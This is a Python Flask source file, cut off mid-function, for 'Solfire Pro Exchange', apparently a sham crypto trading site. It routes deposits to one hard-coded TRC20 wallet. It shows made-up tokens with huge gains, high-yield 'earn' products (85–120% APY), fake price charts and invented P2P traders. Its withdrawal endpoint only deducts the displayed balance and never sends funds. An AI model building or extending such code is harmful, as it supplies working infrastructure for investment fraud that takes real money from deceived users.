# app.py - Solfire Pro Exchange - Complete Edition
# Requires: flask, requests
# Run: python app.py -> open http://127.0.0.1:5000/login-page

from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import os, secrets, threading, time, uuid, random, json, math
import requests
from functools import wraps

# ---------- CONFIG (PRESERVED - DO NOT CHANGE) ----------
WALLET_ADDRESS  = "TAMvBeCmd9VruNxPGjNamMR2wL9EMHNVnU"
NETWORK_LABEL   = "TRX (TRC20)"
VS_CURRENCY     = "usd"
FETCH_INTERVAL  = 30
CLIENT_POLL_MS  = 1500
TOP_N           = 50
STARTING_USDT   = 0.0
# --------------------------------------------------------

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(24)

_BASE = os.path.dirname(os.path.abspath(__file__))

# ── Load mock tokens ──────────────────────────────────────────────────────────
with open(os.path.join(_BASE, "mock_tokens.json")) as _f:
    _mock_raw = json.load(_f)

_now_ts = int(time.time())
MOCK_TOKEN_DICT: dict = {}
for _t in _mock_raw:
    _s = _t["symbol"]
    MOCK_TOKEN_DICT[_s] = {
        "id": _s.lower(), "symbol": _s, "name": _t["name"],
        "price": float(_t["base_price"]),
        "change_24h": float(_t.get("change_24h", random.uniform(10, 60))),
        "change_1h":  float(_t.get("change_1h",  random.uniform(0.5, 8))),
        "change_7d":  float(_t.get("change_7d",  random.uniform(80, 350))),
        "volume_24h": float(_t.get("volume_24h", random.uniform(5e5, 5e7))),
        "market_cap": float(_t["market_cap"]),
        "image":      _t.get("image", f"https://placehold.co/30x30/fcd535/181a20?text={_s[:2]}"),
        "isMock":     True,
        "listed_at":  _now_ts - int(_t.get("days_listed", random.randint(1, 30))) * 86400,
        "liquidity":  float(_t.get("liquidity", 0.8)),
        "color":      _t.get("color", "fcd535"),
    }

# ── Hard-coded real-coin baseline (PRESERVED + extended fields) ──────────────
_R = lambda days: _now_ts - days * 86400
INITIAL_MARKET = {
    "BTC":  {"id":"bitcoin",       "symbol":"BTC",  "name":"Bitcoin",      "price":68450.20,"change_24h":2.5, "change_1h":0.3, "change_7d":8.2,  "volume_24h":28e9,  "market_cap":1.3e12, "image":"https://assets.coingecko.com/coins/images/1/large/bitcoin.png",                                             "isMock":False,"listed_at":_R(4000)},
    "ETH":  {"id":"ethereum",      "symbol":"ETH",  "name":"Ethereum",     "price":3850.10, "change_24h":1.2, "change_1h":0.1, "change_7d":5.1,  "volume_24h":14e9,  "market_cap":4.6e11, "image":"https://assets.coingecko.com/coins/images/279/large/ethereum.png",                                           "isMock":False,"listed_at":_R(3600)},
    "SOL":  {"id":"solana",        "symbol":"SOL",  "name":"Solana",       "price":175.40,  "change_24h":5.4, "change_1h":0.6, "change_7d":18.4, "volume_24h":4.2e9, "market_cap":7.8e10, "image":"https://assets.coingecko.com/coins/images/4128/large/solana.png",                                            "isMock":False,"listed_at":_R(1400)},
    "BNB":  {"id":"binancecoin",   "symbol":"BNB",  "name":"BNB",          "price":590.30,  "change_24h":-0.5,"change_1h":0.0, "change_7d":3.2,  "volume_24h":1.8e9, "market_cap":8.9e10, "image":"https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",                                      "isMock":False,"listed_at":_R(2500)},
    "XRP":  {"id":"ripple",        "symbol":"XRP",  "name":"XRP",          "price":0.62,    "change_24h":0.8, "change_1h":0.1, "change_7d":2.5,  "volume_24h":1.3e9, "market_cap":3.4e10, "image":"https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png",                               "isMock":False,"listed_at":_R(3800)},
    "DOGE": {"id":"dogecoin",      "symbol":"DOGE", "name":"Dogecoin",     "price":0.15,    "change_24h":12.0,"change_1h":1.4, "change_7d":22.1, "volume_24h":2.1e9, "market_cap":2.1e10, "image":"https://assets.coingecko.com/coins/images/5/large/dogecoin.png",                                            "isMock":False,"listed_at":_R(3900)},
    "ADA":  {"id":"cardano",       "symbol":"ADA",  "name":"Cardano",      "price":0.55,    "change_24h":-1.2,"change_1h":-0.2,"change_7d":-3.1, "volume_24h":6.1e8, "market_cap":1.9e10, "image":"https://assets.coingecko.com/coins/images/975/large/cardano.png",                                            "isMock":False,"listed_at":_R(2800)},
    "AVAX": {"id":"avalanche-2",   "symbol":"AVAX", "name":"Avalanche",    "price":45.20,   "change_24h":3.1, "change_1h":0.4, "change_7d":9.8,  "volume_24h":7.2e8, "market_cap":1.8e10, "image":"https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png",                 "isMock":False,"listed_at":_R(1300)},
    "TRX":  {"id":"tron",          "symbol":"TRX",  "name":"TRON",         "price":0.12,    "change_24h":0.1, "change_1h":0.0, "change_7d":1.2,  "volume_24h":4.5e8, "market_cap":1.1e10, "image":"https://assets.coingecko.com/coins/images/1094/large/tron-logo.png",                                        "isMock":False,"listed_at":_R(2600)},
    "LINK": {"id":"chainlink",     "symbol":"LINK", "name":"Chainlink",    "price":18.90,   "change_24h":4.5, "change_1h":0.5, "change_7d":14.2, "volume_24h":5.8e8, "market_cap":1.1e10, "image":"https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png",                                "isMock":False,"listed_at":_R(2400)},
    "DOT":  {"id":"polkadot",      "symbol":"DOT",  "name":"Polkadot",     "price":8.50,    "change_24h":-2.1,"change_1h":-0.3,"change_7d":-5.4, "volume_24h":4.1e8, "market_cap":1.1e10, "image":"https://assets.coingecko.com/coins/images/12171/large/polkadot.png",                                        "isMock":False,"listed_at":_R(1500)},
    "MATIC":{"id":"matic-network", "symbol":"MATIC","name":"Polygon",      "price":0.95,    "change_24h":1.4, "change_1h":0.2, "change_7d":4.8,  "volume_24h":5.2e8, "market_cap":9.4e9,  "image":"https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png",                                "isMock":False,"listed_at":_R(2200)},
    "LTC":  {"id":"litecoin",      "symbol":"LTC",  "name":"Litecoin",     "price":85.30,   "change_24h":0.5, "change_1h":0.1, "change_7d":2.1,  "volume_24h":3.5e8, "market_cap":6.4e9,  "image":"https://assets.coingecko.com/coins/images/2/large/litecoin.png",                                            "isMock":False,"listed_at":_R(3900)},
    "BCH":  {"id":"bitcoin-cash",  "symbol":"BCH",  "name":"Bitcoin Cash", "price":450.20,  "change_24h":6.7, "change_1h":0.8, "change_7d":12.4, "volume_24h":2.8e8, "market_cap":8.9e9,  "image":"https://assets.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png",                              "isMock":False,"listed_at":_R(3100)},
    "SHIB": {"id":"shiba-inu",     "symbol":"SHIB", "name":"Shiba Inu",    "price":0.000025,"change_24h":15.3,"change_1h":1.8, "change_7d":28.5, "volume_24h":1.6e9, "market_cap":1.5e10, "image":"https://assets.coingecko.com/coins/images/11939/large/shiba.png",                                            "isMock":False,"listed_at":_R(1200)},
    "UNI":  {"id":"uniswap",       "symbol":"UNI",  "name":"Uniswap",      "price":11.20,   "change_24h":-3.4,"change_1h":-0.4,"change_7d":-8.2, "volume_24h":3.2e8, "market_cap":6.7e9,  "image":"https://assets.coingecko.com/coins/images/12504/large/uniswap-uni.png",                                    "isMock":False,"listed_at":_R(1600)},
    "ATOM": {"id":"cosmos",        "symbol":"ATOM", "name":"Cosmos",       "price":12.40,   "change_24h":2.2, "change_1h":0.3, "change_7d":6.8,  "volume_24h":2.9e8, "market_cap":4.9e9,  "image":"https://assets.coingecko.com/coins/images/1481/large/cosmos_hub.png",                                      "isMock":False,"listed_at":_R(2100)},
    "XLM":  {"id":"stellar",       "symbol":"XLM",  "name":"Stellar",      "price":0.13,    "change_24h":1.1, "change_1h":0.1, "change_7d":3.5,  "volume_24h":1.8e8, "market_cap":3.6e9,  "image":"https://assets.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png",                         "isMock":False,"listed_at":_R(3500)},
    "NEAR": {"id":"near",          "symbol":"NEAR", "name":"NEAR Protocol","price":7.10,    "change_24h":8.9, "change_1h":1.0, "change_7d":19.8, "volume_24h":4.8e8, "market_cap":7.8e9,  "image":"https://assets.coingecko.com/coins/images/10365/large/near.png",                                            "isMock":False,"listed_at":_R(900)},
    "APT":  {"id":"aptos",         "symbol":"APT",  "name":"Aptos",        "price":14.50,   "change_24h":-1.5,"change_1h":-0.2,"change_7d":-4.2, "volume_24h":3.6e8, "market_cap":5.9e9,  "image":"https://assets.coingecko.com/coins/images/26455/large/aptos_round.png",                                    "isMock":False,"listed_at":_R(700)},
    "ARB":  {"id":"arbitrum",      "symbol":"ARB",  "name":"Arbitrum",     "price":1.65,    "change_24h":4.2, "change_1h":0.5, "change_7d":12.1, "volume_24h":5.4e8, "market_cap":6.6e9,  "image":"https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg",                    "isMock":False,"listed_at":_R(600)},
    "OP":   {"id":"optimism",      "symbol":"OP",   "name":"Optimism",     "price":3.80,    "change_24h":5.1, "change_1h":0.6, "change_7d":15.4, "volume_24h":4.2e8, "market_cap":4.8e9,  "image":"https://assets.coingecko.com/coins/images/25244/large/Optimism.png",                                       "isMock":False,"listed_at":_R(550)},
    "INJ":  {"id":"injective-protocol","symbol":"INJ","name":"Injective",  "price":38.20,   "change_24h":11.4,"change_1h":1.3, "change_7d":24.8, "volume_24h":6.1e8, "market_cap":3.6e9,  "image":"https://assets.coingecko.com/coins/images/12882/large/Secondary_Symbol.png",                               "isMock":False,"listed_at":_R(480)},
    "RNDR": {"id":"render-token",  "symbol":"RNDR", "name":"Render",       "price":10.50,   "change_24h":7.8, "change_1h":0.9, "change_7d":18.2, "volume_24h":3.8e8, "market_cap":4.1e9,  "image":"https://assets.coingecko.com/coins/images/11636/large/rndr.png",                                          "isMock":False,"listed_at":_R(420)},
    "FTM":  {"id":"fantom",        "symbol":"FTM",  "name":"Fantom",       "price":0.95,    "change_24h":-4.2,"change_1h":-0.5,"change_7d":-9.8, "volume_24h":2.4e8, "market_cap":2.7e9,  "image":"https://assets.coingecko.com/coins/images/4001/large/Fantom_round.png",                                   "isMock":False,"listed_at":_R(2000)},
    "TIA":  {"id":"celestia",      "symbol":"TIA",  "name":"Celestia",     "price":15.20,   "change_24h":2.1, "change_1h":0.2, "change_7d":6.4,  "volume_24h":3.1e8, "market_cap":3.2e9,  "image":"https://assets.coingecko.com/coins/images/31967/large/celestia-logo.png",                                  "isMock":False,"listed_at":_R(180)},
    "SEI":  {"id":"sei-network",   "symbol":"SEI",  "name":"Sei",          "price":0.85,    "change_24h":6.3, "change_1h":0.7, "change_7d":16.1, "volume_24h":2.6e8, "market_cap":2.2e9,  "image":"https://assets.coingecko.com/coins/images/28205/large/Sei_Logo_-_Transparent.png",                        "isMock":False,"listed_at":_R(300)},
    "SUI":  {"id":"sui",           "symbol":"SUI",  "name":"Sui",          "price":1.70,    "change_24h":-2.8,"change_1h":-0.3,"change_7d":-6.4, "volume_24h":3.4e8, "market_cap":4.8e9,  "image":"https://assets.coingecko.com/coins/images/26375/large/sui-ocean-square.png",                              "isMock":False,"listed_at":_R(400)},
    "PEPE": {"id":"pepe",          "symbol":"PEPE", "name":"Pepe",         "price":0.000007,"change_24h":25.4,"change_1h":2.9, "change_7d":48.2, "volume_24h":2.1e9, "market_cap":3.0e9,  "image":"https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg",                                   "isMock":False,"listed_at":_R(350)},
    "WIF":  {"id":"dogwifcoin",    "symbol":"WIF",  "name":"dogwifhat",    "price":2.80,    "change_24h":40.5,"change_1h":4.8, "change_7d":82.1, "volume_24h":1.4e9, "market_cap":2.8e9,  "image":"https://assets.coingecko.com/coins/images/33566/large/dogwifhat.jpg",                                     "isMock":False,"listed_at":_R(200)},
    # ── Existing fake coins (preserved) ──
    "SLFR": {"id":"solfire",       "symbol":"SLFR", "name":"Solfire Token","price":1.45,    "change_24h":150.5,"change_1h":12.1,"change_7d":480.2,"volume_24h":1.2e7, "market_cap":1.45e8, "image":"https://placehold.co/30x30/fcd535/181a20?text=SF",                                                          "isMock":True, "listed_at":_R(60)},
    "MOON": {"id":"moon",          "symbol":"MOON", "name":"Moon Coin",    "price":0.0045,  "change_24h":45.2,"change_1h":5.1, "change_7d":182.4,"volume_24h":3.2e6, "market_cap":4.5e6,  "image":"https://placehold.co/30x30/6366f1/ffffff?text=MN",                                                          "isMock":True, "listed_at":_R(45)},
    "GEMS": {"id":"gems",          "symbol":"GEMS", "name":"Gems Network", "price":0.08,    "change_24h":-5.6,"change_1h":-0.6,"change_7d":-12.4,"volume_24h":1.8e6, "market_cap":8.0e6,  "image":"https://placehold.co/30x30/10b981/ffffff?text=GM",                                                          "isMock":True, "listed_at":_R(90)},
    "RICH": {"id":"rich",          "symbol":"RICH", "name":"Rich Protocol","price":12.30,   "change_24h":80.1,"change_1h":8.4, "change_7d":320.8,"volume_24h":8.4e6, "market_cap":1.23e8, "image":"https://placehold.co/30x30/f59e0b/181a20?text=RC",                                                          "isMock":True, "listed_at":_R(30)},
    "NINJA":{"id":"ninja",         "symbol":"NINJA","name":"Ninja Coin",   "price":5.50,    "change_24h":12.4,"change_1h":1.4, "change_7d":58.6, "volume_24h":5.6e6, "market_cap":5.5e7,  "image":"https://placehold.co/30x30/dc2626/ffffff?text=NJ",                                                          "isMock":True, "listed_at":_R(75)},
}
INITIAL_MARKET.update(MOCK_TOKEN_DICT)

# ── In-memory stores ──────────────────────────────────────────────────────────
market_cache    = {"last_update": 0, "data": INITIAL_MARKET.copy(), "prev": {}}
users_store     = {}
global_orderbook= {"limit_orders": []}

# P2P
p2p_store = {"orders": [], "chats": {}, "disputes": {}}

# Earn
EARN_PRODUCTS = [
    {"id":"usdt-flex",  "name":"USDT Flexible", "symbol":"USDT","apy":4.2,  "min_amount":1,    "max_amount":1000000,"type":"flexible","duration_days":None,"total_locked":12500000,"subscribers":4821},
    {"id":"btc-flex",   "name":"BTC Flexible",  "symbol":"BTC", "apy":1.5,  "min_amount":0.0001,"max_amount":10,    "type":"flexible","duration_days":None,"total_locked":842,     "subscribers":1205},
    {"id":"eth-flex",   "name":"ETH Flexible",  "symbol":"ETH", "apy":3.2,  "min_amount":0.001,"max_amount":100,   "type":"flexible","duration_days":None,"total_locked":4182,    "subscribers":2340},
    {"id":"usdt-30d",   "name":"USDT Fixed 30D","symbol":"USDT","apy":8.5,  "min_amount":100,  "max_amount":500000,"type":"fixed",   "duration_days":30,  "total_locked":5000000, "subscribers":1840},
    {"id":"usdt-90d",   "name":"USDT Fixed 90D","symbol":"USDT","apy":12.0, "min_amount":100,  "max_amount":200000,"type":"fixed",   "duration_days":90,  "total_locked":2800000, "subscribers":945},
    {"id":"usdt-180d",  "name":"USDT Fixed 180D","symbol":"USDT","apy":15.5,"min_amount":500,  "max_amount":100000,"type":"fixed",   "duration_days":180, "total_locked":1200000, "subscribers":412},
    {"id":"sol-stake",  "name":"SOL Staking",   "symbol":"SOL", "apy":6.8,  "min_amount":0.1,  "max_amount":10000, "type":"staking", "duration_days":None,"total_locked":120000,  "subscribers":3820},
    {"id":"bnb-stake",  "name":"BNB Staking",   "symbol":"BNB", "apy":5.1,  "min_amount":0.01, "max_amount":1000,  "type":"staking", "duration_days":None,"total_locked":45000,   "subscribers":2145},
    {"id":"slfr-stake", "name":"SLFR High Yield","symbol":"SLFR","apy":85.0,"min_amount":1,    "max_amount":100000,"type":"staking", "duration_days":None,"total_locked":8500000, "subscribers":6280},
    {"id":"nova-stake", "name":"NOVA Yield",    "symbol":"NOVA","apy":120.0,"min_amount":10,   "max_amount":500000,"type":"staking", "duration_days":None,"total_locked":2100000, "subscribers":4102},
]
earn_positions = {}  # sid -> [position]

# Futures
FUTURES_CONTRACTS = {s: {"symbol":s,"max_leverage":100 if s in ("BTC","ETH") else 50,
    "min_leverage":1,"taker_fee":0.0004,"maker_fee":0.0002,"maintenance_margin":0.005}
    for s in ["BTC","ETH","SOL","BNB","XRP","DOGE","AVAX","LINK","MATIC","ARB","SLFR","NOVA","APEX","CIPHER","ZENITH"]}
futures_positions = {}  # sid -> [position]

# ── Helpers ───────────────────────────────────────────────────────────────────
def login_required(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        if not session.get("user"):
            return redirect(url_for("login_page"))
        return fn(*a, **kw)
    return wrapper

def current_session_id():
    sid = session.get("_sid")
    if not sid:
        sid = str(uuid.uuid4())
        session["_sid"] = sid
    return sid

def ensure_user_store():
    sid = current_session_id()
    if sid not in users_store:
        bal = {"USDT": float(STARTING_USDT)}
        for s in market_cache.get("data", {}):
            bal[s] = 0.0
        users_store[sid] = {"balances": bal, "orders": [], "trades": [], "transfers": []}
    return users_store[sid]

def _price(sym):
    return market_cache["data"].get(sym, {}).get("price", 0)

# Seed a few mock P2P orders on first use
def _seed_p2p():
    if p2p_store["orders"]:
        return
    makers = [
        ("alice_maker","alice@example.com"),
        ("bob_trader","bob@example.com"),
        ("crypto_king","king@example.com"),
        ("stella_p2p","stella@example.com"),
        ("david_fx","david@example.com"),
    ]
    methods = ["Bank Transfer","PayPal","Wise","Revolut","Zelle","Cash App","SEPA"]
    fiats   = ["USD","EUR","GBP","AUD","CAD","SGD"]
    for i in range(20):
        sym = random.choice(["USDT","BTC","ETH","SOL"])
        side = random.choice(["sell","buy"])  # from maker's perspective
        m = random.choice(makers)
        price_premium = random.uniform(0.98, 1.04)
        base = _price(sym) or 1.0
        p2p_store["orders"].append({
            "id": str(uuid.uuid4()),
            "maker_name": m[0],
            "maker_email": m[1],
            "symbol": sym,
            "side": side,
            "price": round(base * price_premium, 6),
            "amount_total": round(random.uniform(100, 5000), 2),
            "amount_remaining": round(random.uniform(100, 5000), 2),
            "min_order": round(random.uniform(10, 100), 2),
            "max_order": round(random.uniform(200, 2000), 2),
            "payment_methods": random.sample(methods, random.randint(1, 3)),
            "fiat": random.choice(fiats),
            "region": random.choice(["US","EU","UK","APAC","Global"]),
            "created_at": int(time.time()) - random.randint(60, 3600),
            "status": "open",
            "completion_rate": round(random.uniform(85, 100), 1),
            "avg_release_mins": random.randint(5, 30),
            "trades_count": random.randint(10, 500),
        })

# ── Price fetching ────────────────────────────────────────────────────────────
def fetch_prices_once():
    url = "https://api.coingecko.com/api/v3/coins/markets"
    params = {"vs_currency": VS_CURRENCY, "order": "market_cap_desc",
              "per_page": TOP_N, "page": 1, "sparkline": "false",
              "price_change_percentage": "24h"}
    try:
        resp = requests.get(url, params=params, timeout=10)
        resp.raise_for_status()
        arr = resp.json()
        new = INITIAL_MARKET.copy()
        MOCK_SYMS = set(MOCK_TOKEN_DICT.keys()) | {"SLFR","MOON","GEMS","RICH","NINJA"}
        for item in arr:
            sym = (item.get("symbol") or "").upper()
            if sym in MOCK_SYMS: continue
            p = item.get("current_price")
            if p is not None:
                existing = new.get(sym, {})
                new[sym] = {**existing,
                    "id": item.get("id",""), "symbol": sym, "name": item.get("name",""),
                    "price": float(p),
                    "change_24h": item.get("price_change_percentage_24h") or 0,
                    "volume_24h": item.get("total_volume") or 0,
                    "market_cap": item.get("market_cap") or 0,
                    "image": item.get("image",""), "isMock": False,
                    "listed_at": existing.get("listed_at", _R(365)),
                    "change_1h": existing.get("change_1h", 0),
                    "change_7d": existing.get("change_7d", 0),
                }
        market_cache["prev"] = market_cache["data"].copy()
        market_cache["data"] = new
        market_cache["last_update"] = int(time.time())
    except Exception:
        pass

def micro_jitter_worker():
    while True:
        data = market_cache.get("data", {})
        for v in data.values():
            if v.get("price"):
                j = random.uniform(-0.0015, 0.0015)
                v["price"] = max(1e-10, v["price"] * (1 + j))
            if v.get("change_24h") is not None:
                v["change_24h"] += random.uniform(-0.05, 0.05)
        try_match_limits()
        time.sleep(1.5)

def background_api_worker():
    while True:
        try: fetch_prices_once()
        except: pass
        time.sleep(FETCH_INTERVAL)

threading.Thread(target=background_api_worker, daemon=True).start()
threading.Thread(target=micro_jitter_worker, daemon=True).start()

# ── Order execution (PRESERVED) ──────────────────────────────────────────────
def execute_order(order, exec_price, is_limit=False):
    sid  = order["session_id"]
    user = users_store.get(sid)
    if not user: return
    qty  = float(order["quantity"])
    cost = qty * float(exec_price)
    side = order["side"]
    sym  = order["symbol"]
    if side == "buy":
        if user["balances"]["USDT"] + 1e-9 < cost:
            order["status"] = "cancelled_insufficient_funds"
            user["orders"].append(order); return
        user["balances"]["USDT"]  -= cost
        user["balances"][sym]      = user["balances"].get(sym, 0.0) + qty
    else:
        if user["balances"].get(sym, 0.0) + 1e-9 < qty:
            order["status"] = "cancelled_insufficient_balance"
            user["orders"].append(order); return
        user["balances"][sym]     -= qty
        user["balances"]["USDT"] += cost
    rec = dict(order)
    rec.update({"executed_price": float(exec_price), "status": "filled",
                "filled_at": int(time.time())})
    user["orders"].append(rec)
    user["trades"].append({"id": str(uuid.uuid4()), "symbol": sym, "side": side,
        "price": float(exec_price), "quantity": qty,
        "timestamp": int(time.time()), "from_limit": bool(is_limit)})

def try_match_limits():
    data   = market_cache.get("data", {})
    to_rm  = []
    for order in list(global_orderbook["limit_orders"]):
        sym        = order["symbol"]
        price_now  = data.get(sym, {}).get("price")
        if price_now is None: continue
        if order["side"] == "buy"  and price_now <= order["limit_price"]: execute_order(order, price_now, True); to_rm.append(order)
        elif order["side"] == "sell" and price_now >= order["limit_price"]: execute_order(order, price_now, True); to_rm.append(order)
    for o in to_rm:
        try: global_orderbook["limit_orders"].remove(o)
        except: pass

# ── Price history generator for charts ───────────────────────────────────────
def generate_price_history(symbol, points=60):
    """Generate fake OHLCV candle data for chart display."""
    data  = market_cache.get("data", {})
    item  = data.get(symbol, {})
    if not item: return []
    now   = int(time.time())
    price = float(item.get("price", 1.0))
    # Walk backwards to create a realistic series
    result = []
    p = price
    for i in range(points, 0, -1):
        ts    = now - i * 3600
        open_ = p
        j     = random.gauss(0, 0.012)
        close = max(1e-10, p * (1 + j))
        high  = max(open_, close) * random.uniform(1.001, 1.02)
        low   = min(open_, close) * random.uniform(0.98, 0.999)
        vol   = float(item.get("volume_24h", 1e6)) / 24 * random.uniform(0.4, 2.0)
        result.append({"t": ts, "o": round(open_, 8), "h": round(high, 8),
                       "l": round(low, 8), "c": round(close, 8), "v": round(vol, 2)})
        p = close
    return result

# ═══════════════════════════════════════════════════════════════════════════════
# ROUTES — AUTH
# ═══════════════════════════════════════════════════════════════════════════════
@app.route("/login-page")
def login_page():
    err = request.args.get("error","")
    return render_template("login.html", err=err)

@app.route("/login", methods=["POST"])
def do_login():
    email = (request.form.get("email") or "").strip()
    pwd   = (request.form.get("password") or "")
    if not email or not pwd:
        return redirect(url_for("login_page", error="Email and password required"))
    if not email.lower().endswith("@gmail.com"):
        return redirect(url_for("login_page", error="Use a valid @gmail.com account"))
    session["user"] = {"email": email, "name": email.split("@")[0]}
    ensure_user_store()
    _seed_p2p()
    return redirect(url_for("home"))

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login_page"))

# ═══════════════════════════════════════════════════════════════════════════════
# ROUTES — PAGES
# ═══════════════════════════════════════════════════════════════════════════════
@app.route("/")
@login_required
def home():
    user = session.get("user", {"name": "User", "email": ""})
    return render_template("home.html",
        user=user, wallet=WALLET_ADDRESS, network=NETWORK_LABEL,
        client_poll=CLIENT_POLL_MS)

@app.route("/p2p")
@login_required
def p2p():
    user = session.get("user", {"name":"User","email":""})
    _seed_p2p()
    return render_template("p2p.html", user=user, client_poll=CLIENT_POLL_MS)

@app.route("/buy-crypto")
@login_required
def buy_crypto():
    user = session.get("user", {"name":"User","email":""})
    return render_template("buy_crypto.html", user=user, client_poll=CLIENT_POLL_MS)

@app.route("/earn")
@login_required
def earn():
    user = session.get("user", {"name":"User","email":""})
    return render_template("earn.html", user=user,
        products=EARN_PRODUCTS, client_poll=CLIENT_POLL_MS)

@app.route("/more")
@login_required
def more():
    user = session.get("user", {"name":"User","email":""})
    return render_template("more.html", user=user)

@app.route("/markets")
@login_required
def markets():
    user = session.get("user", {"name":"User","email":""})
    return render_template("markets.html", user=user, client_poll=CLIENT_POLL_MS)

@app.route("/trade")
@app.route("/trade/<symbol>")
@login_required
def trade(symbol="BTC"):
    symbol = symbol.upper()
    data   = market_cache.get("data", {})
    if symbol not in data:
        symbol = "BTC"
    user = session.get("user", {"name":"User","email":""})
    return render_template("trade.html", user=user,
        symbol=symbol, client_poll=CLIENT_POLL_MS,
        futures_contracts=list(FUTURES_CONTRACTS.keys()))

@app.route("/futures")
@login_required
def futures():
    user = session.get("user", {"name":"User","email":""})
    return render_template("futures.html", user=user,
        contracts=list(FUTURES_CONTRACTS.keys()), client_poll=CLIENT_POLL_MS)

@app.route("/wallet")
@login_required
def wallet():
    user = session.get("user", {"name":"User","email":""})
    return render_template("wallet.html", user=user,
        wallet_addr=WALLET_ADDRESS, network=NETWORK_LABEL, client_poll=CLIENT_POLL_MS)

# ═══════════════════════════════════════════════════════════════════════════════
# ROUTES — API  (existing, preserved)
# ═══════════════════════════════════════════════════════════════════════════════
@app.route("/api/prices")
def api_prices():
    return jsonify({"last_update": market_cache.get("last_update",0),
                    "data": market_cache.get("data",{})})

@app.route("/api/account")
@login_required
def api_account():
    store = ensure_user_store()
    return jsonify({"usdt": store["balances"].get("USDT",0.0),
                    "orders": store["orders"], "trades": store["trades"],
                    "transfers": store["transfers"]})

@app.route("/api/place_order", methods=["POST"])
@login_required
def api_place_order():
    sid   = current_session_id()
    store = ensure_user_store()
    p     = request.get_json() or request.form
    sym   = (p.get("symbol") or "").upper()
    side  = (p.get("side") or "").lower()
    typ   = (p.get("type") or "").lower()
    try:   qty = float(p.get("quantity") or 0.0)
    except: return jsonify({"ok":False,"error":"invalid quantity"}), 400
    if sym not in market_cache.get("data",{}): return jsonify({"ok":False,"error":"unknown symbol"}), 400
    if side not in ("buy","sell"):             return jsonify({"ok":False,"error":"invalid side"}), 400
    if typ  not in ("market","limit"):         return jsonify({"ok":False,"error":"invalid type"}), 400
    if qty <= 0:                               return jsonify({"ok":False,"error":"quantity must be > 0"}), 400
    price_now = market_cache["data"].get(sym,{}).get("price")
    order = {"id": str(uuid.uuid4()), "session_id": sid, "symbol": sym,
             "side": side, "type": typ, "quantity": qty,
             "created_at": int(time.time()), "status": "open"}
    if typ == "market":
        if price_now is None: return jsonify({"ok":False,"error":"market price unavailable"}), 400
        execute_order(order, price_now)
        return jsonify({"ok":True,"executed_price":price_now})
    else:
        try:   lim = float(p.get("limit_price"))
        except: return jsonify({"ok":False,"error":"invalid limit_price"}), 400
        order["limit_price"] = lim
        if side == "buy":
            reserve = lim * qty
            if store["balances"]["USDT"] + 1e-9 < reserve:
                return jsonify({"ok":False,"error":"insufficient USDT"}), 400
            store["balances"]["USDT"] -= reserve
            order["reserved_usdt"] = reserve
        else:
            if store["balances"].get(sym,0.0) + 1e-9 < qty:
                return jsonify({"ok":False,"error":f"insufficient {sym}"}), 400
            store["balances"][sym] -= qty
            order["reserved_qty"] = qty
        global_orderbook["limit_orders"].append(order)
        return jsonify({"ok":True,"placed":order})

@app.route("/api/withdraw", methods=["POST"])
@login_required
def api_withdraw():
    store = ensure_user_store()
    p     = request.get_json() or request.form
    try:   amt = float(p.get("amount") or 0.0)
    except: return jsonify({"ok":False,"error":"invalid amount"}), 400
    addr    = (p.get("address") or "").strip()
    network = (p.get("network") or NETWORK_LABEL).strip()
    if amt <= 0:   return jsonify({"ok":False,"error":"amount must be > 0"}), 400
    if not addr:   return jsonify({"ok":False,"error":"address required"}), 400
    if store["balances"].get("USDT",0.0) + 1e-9 < amt:
        return jsonify({"ok":False,"error":"insufficient USDT"}), 400
    store["balances"]["USDT"] -= amt
    tx = {"id": str(uuid.uuid4()), "to": addr, "network": network, "amount": amt,
          "status": "Processing", "timestamp": int(time.time())}
    store["transfers"].append(tx)
    return jsonify({"ok":True,"tx":tx,"new_balance":store["balances"]["USDT"]})

# ═══════════════════════════════════════════════════════════════════════════════
# ROUTES — API  (new)
# ═══════════════════════════════════════════════════════════════════════════════

# ── Markets ──
@app.route("/api/markets/gainers")
@login_required
def api_gainers():
    window = request.args.get("window","24h")
    field  = {"1h":"change_1h","7d":"change_7d"}.get(window,"change_24h")
    data   = market_cache.get("data",{})
    items  = [v for v in data.values() if v.get(field) is not None]
    items.sort(key=lambda x: x.get(field,0), reverse=True)
    return jsonify({"ok":True,"data":items[:50],"window":window})

@app.route("/api/markets/losers")
@login_required
def api_losers():
    window = request.args.get("window","24h")
    field  = {"1h":"change_1h","7d":"change_7d"}.get(window,"change_24h")
    data   = market_cache.get("data",{})
    items  = [v for v in data.values() if v.get(field) is not None]
    items.sort(key=lambda x: x.get(field,0))
    return jsonify({"ok":True,"data":items[:50],"window":window})

@app.route("/api/markets/new")
@login_required
def api_new_listings():
    page  = int(request.args.get("page",1))
    per   = int(request.args.get("per",20))
    data  = market_cache.get("data",{})
    items = [v for v in data.values() if v.get("listed_at")]
    items.sort(key=lambda x: x.get("listed_at",0), reverse=True)
    start = (page-1)*per
    return jsonify({"ok":True,"data":items[start:start+per],
                    "total":len(items),"page":page,"per":per})

@app.route("/api/prices/chart/<symbol>")
@login_required
def api_price_chart(symbol):
    symbol = symbol.upper()
    return jsonify({"ok":True,"symbol":symbol,
                    "candles": generate_price_history(symbol,
                        int(request.args.get("points",60)))})

# ── P2P ──
@app.route("/api/p2p/orders")
@login_required
def api_p2p_orders():
    sym     = (request.args.get("symbol") or "").upper()
    side    = (request.args.get("side") or "").lower()
    method  = (request.args.get("method") or "")
    fiat    = (request.args.get("fiat") or "")
    min_amt = request.args.get("min_amount")
    max_amt = request.args.get("max_amount")
    orders  = [o for o in p2p_store["orders"] if o["status"] == "open"]
    if sym:    orders = [o for o in orders if o["symbol"] == sym]
    if side:   orders = [o for o in orders if o["side"] == side]
    if method: orders = [o for o in orders if method in o["payment_methods"]]
    if fiat:   orders = [o for o in orders if o["fiat"] == fiat]
    if min_amt:
